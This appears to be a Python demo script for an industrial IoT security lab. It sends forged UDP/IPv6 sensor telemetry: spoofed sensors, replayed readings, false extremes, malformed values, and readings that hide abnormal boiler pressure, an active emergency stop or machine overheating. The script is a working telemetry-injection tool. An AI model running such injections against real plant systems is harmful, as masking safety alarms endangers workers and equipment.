#!/usr/bin/env python3
import argparse
import json
import socket
import time
from datetime import datetime, timezone

REFRESH_ATTACKS = {
    "spoof",
    "extreme",
    "malformed",
    "boiler-pressure-masked",
    "emergency-stop-hidden",
    "machine-overheat-hidden",
}
METADATA_FIELDS = {"sensor_id", "node_id", "label", "unit", "timestamp", "attack"}


def utc_now():
    return datetime.now(timezone.utc).isoformat()


def spoof_payloads():
    return [
        {
            "sensor_id": "GAS-BAY-ROGUE",
            "node_id": "node-04",
            "label": "Loading Bay",
            "gas_leak": "Gas detected",
            "occupancy": "Occupied",
            "air_quality": 760.0,
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "spoof",
        }
    ]


def replay_payloads():
    return [
        {
            "sensor_id": "TEMP-BLR,GAS-BLR,PRESS-BLR,ESTOP-BLR",
            "node_id": "node-01",
            "label": "Boiler Room",
            "temperature": 24.4,
            "gas_leak": "Normal",
            "pressure_status": "Normal",
            "emergency_stop": "Ready",
            "unit": "mixed",
            "timestamp": "2026-07-01T00:00:00+00:00",
            "attack": "replay",
        }
    ]


def extreme_payloads():
    return [
        {
            "sensor_id": "TEMP-LINE,HUM-LINE,OVERHEAT-LINE,ESTOP-LINE",
            "node_id": "node-02",
            "label": "Process Line",
            "temperature": 65.0,
            "humidity": 18.0,
            "machine_overheat": "Overheat detected",
            "emergency_stop": "Emergency stop active",
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "false_extreme",
        }
    ]


def missing_payloads():
    return [
        {
            "sensor_id": "TEMP-BLR,GAS-BLR,PRESS-BLR,ESTOP-BLR",
            "node_id": "node-01",
            "label": "Boiler Room",
            "temperature": 22.8,
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "missing_telemetry",
        },
        {
            "sensor_id": "TEMP-LINE,HUM-LINE,OVERHEAT-LINE,ESTOP-LINE",
            "node_id": "node-02",
            "label": "Process Line",
            "humidity": 48.6,
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "missing_telemetry",
        },
        {
            "sensor_id": "TEMP-COLD,HUM-COLD,DOOR-COLD,AIR-COLD",
            "node_id": "node-03",
            "label": "Cold Storage",
            "occupancy": "Occupied",
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "missing_telemetry",
        },
    ]


def malformed_payloads():
    return [
        {
            "sensor_id": "PROTO-BAD-01",
            "node_id": "node-01",
            "label": "Boiler Room",
            "temperature": "not-a-temperature",
            "pressure_status": "???",
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "malformed_protocol",
        }
    ]


def boiler_pressure_masked_payloads():
    return [
        {
            "sensor_id": "TEMP-BLR,GAS-BLR,PRESS-BLR,ESTOP-BLR",
            "node_id": "node-01",
            "label": "Boiler Room",
            "temperature": 78.4,
            "gas_leak": "Normal",
            "pressure_status": "Normal",
            "emergency_stop": "Ready",
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "boiler_pressure_masked",
        }
    ]


def emergency_stop_hidden_payloads():
    return [
        {
            "sensor_id": "TEMP-BLR,GAS-BLR,PRESS-BLR,ESTOP-BLR",
            "node_id": "node-01",
            "label": "Boiler Room",
            "temperature": 74.9,
            "pressure_status": "Pressure abnormal",
            "emergency_stop": "Ready",
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "emergency_stop_hidden",
        }
    ]


def machine_overheat_hidden_payloads():
    return [
        {
            "sensor_id": "TEMP-LINE,HUM-LINE,OVERHEAT-LINE,ESTOP-LINE",
            "node_id": "node-02",
            "label": "Process Line",
            "temperature": 86.3,
            "machine_overheat": "Normal",
            "emergency_stop": "Ready",
            "unit": "mixed",
            "timestamp": utc_now(),
            "attack": "machine_overheat_hidden",
        }
    ]


ATTACKS = {
    "spoof": {
        "payloads": spoof_payloads,
        "impact": "A fake sensor identity can influence dashboard temperature if the gateway trusts valid JSON only.",
    },
    "replay": {
        "payloads": replay_payloads,
        "impact": "A stale but valid reading can appear current when freshness is not checked.",
    },
    "extreme": {
        "payloads": extreme_payloads,
        "impact": "A syntactically valid extreme value can create a safety-relevant dashboard condition.",
    },
    "missing": {
        "payloads": missing_payloads,
        "impact": "The air-quality sensor is omitted, showing loss of visibility rather than a malformed packet.",
    },
    "malformed": {
        "payloads": malformed_payloads,
        "impact": "A syntactically valid message carries unexpected scalar values into the MQTT relay.",
    },
    "boiler-pressure-masked": {
        "payloads": boiler_pressure_masked_payloads,
        "impact": "Boiler Room pressure is reported normal while other process readings suggest a dangerous condition.",
    },
    "emergency-stop-hidden": {
        "payloads": emergency_stop_hidden_payloads,
        "impact": "Emergency stop status remains falsely ready during abnormal boiler pressure.",
    },
    "machine-overheat-hidden": {
        "payloads": machine_overheat_hidden_payloads,
        "impact": "Process Line overheat is hidden while temperature is unsafe.",
    },
}


def display_attack_name(attack_name):
    if attack_name == "spoof":
        return "spoofed"
    return attack_name


def attack_target(payloads):
    targets = []
    for reading in payloads:
        node_id = reading.get("node_id", "unknown-node")
        label = reading.get("label", reading.get("sensor_id", "unknown sensor"))
        target = f"{label} ({node_id})"
        if target not in targets:
            targets.append(target)
    return targets[0] if len(targets) == 1 else ", ".join(targets)


def changed_fields(reading):
    return sorted(set(reading) - METADATA_FIELDS)


def print_reading_summary(reading):
    node_id = reading.get("node_id", "unknown-node")
    label = reading.get("label", reading.get("sensor_id", "unknown sensor"))
    print(f"{label} ({node_id}):", flush=True)
    for field in changed_fields(reading):
        print(f"  {field} <- {reading[field]}", flush=True)


def send_payloads(sock, dest, port, payloads):
    for reading in payloads:
        payload = json.dumps(reading, separators=(",", ":")).encode("utf-8")
        sock.sendto(payload, (dest, port))
        print_reading_summary(reading)


def main():
    parser = argparse.ArgumentParser(description="Send controlled SISEN 6LoWPAN attack telemetry over UDP/IPv6.")
    parser.add_argument("--attack", required=True, choices=sorted(ATTACKS), help="Attack activity to run.")
    parser.add_argument("--source", default=None, help="Optional source IPv6 address to bind.")
    parser.add_argument("--dest", required=True, help="Destination IPv6 address.")
    parser.add_argument("--port", type=int, default=9999, help="Destination UDP port.")
    parser.add_argument("--interval", type=float, default=0.5, help="Seconds between payloads.")
    parser.add_argument("--duration", type=float, default=10.0, help="Seconds to refresh applicable attacks.")
    parser.add_argument("--count", type=int, default=5, help="Repeat count for replay attacks.")
    args = parser.parse_args()

    if args.interval <= 0:
        parser.error("--interval must be greater than zero")
    if args.duration < 0:
        parser.error("--duration must be zero or greater")
    if args.count < 1:
        parser.error("--count must be at least 1")

    attack = ATTACKS[args.attack]
    payloads = attack["payloads"]()
    refresh_attack = args.attack in REFRESH_ATTACKS

    print(f"SISEN 6LoWPAN attack demo: {display_attack_name(args.attack)}", flush=True)
    print("Scenario: 6lowpan", flush=True)
    print(f"Target: {attack_target(payloads)}", flush=True)
    print(f"Purpose: {attack['impact']}", flush=True)
    print(flush=True)

    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    if args.source:
        sock.bind((args.source, 0))

    started = time.monotonic()
    publication = 0
    while True:
        publication += 1
        if publication > 1:
            print(flush=True)
            print(f"Refresh {publication}", flush=True)
        send_payloads(sock, args.dest, args.port, payloads)

        if args.attack == "replay":
            if publication >= args.count:
                break
        elif refresh_attack:
            if time.monotonic() - started >= args.duration:
                break
        else:
            break

        time.sleep(args.interval)

    print(flush=True)
    if refresh_attack:
        print(f"Attack completed after {args.duration:g} seconds.", flush=True)
    else:
        print(f"Attack completed after {publication} publication(s).", flush=True)
    print("Normal telemetry will now resume.", flush=True)


if __name__ == "__main__":
    main()
